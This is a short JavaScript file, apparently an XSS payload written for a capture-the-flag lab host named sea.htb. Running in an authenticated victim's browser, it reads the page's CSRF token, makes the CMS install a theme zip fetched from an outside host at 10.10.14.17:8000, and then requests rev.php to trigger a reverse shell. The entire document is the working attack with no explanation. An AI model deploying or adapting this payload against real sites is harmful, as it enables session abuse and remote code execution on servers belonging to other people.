var url = "http://sea.htb/index.php?page=LoginURL";
if (url.endsWith("/")) {
  url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var token = document.querySelectorAll('[name="token"]')[0].value;
var zipInstallURL = urlWithoutLog + "/?installModule=http://10.10.14.17:8000/main.zip&directoryName=revshell-main&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", zipInstallURL);
xhr3.send();
xhr3.onload = function() {
  if (xhr3.status == 200) {
    console.log("Payload installed. Triggering reverse shell...");
    var xhr4 = new XMLHttpRequest();
    xhr4.withCredentials = true;
    xhr4.open("GET", urlWithoutLog + "/themes/revshell-main/rev.php");
    xhr4.send();
    xhr4.onload = function() {
      if (xhr4.status == 200) {
        console.log("Reverse shell triggered.");
      }
    };
  }
};
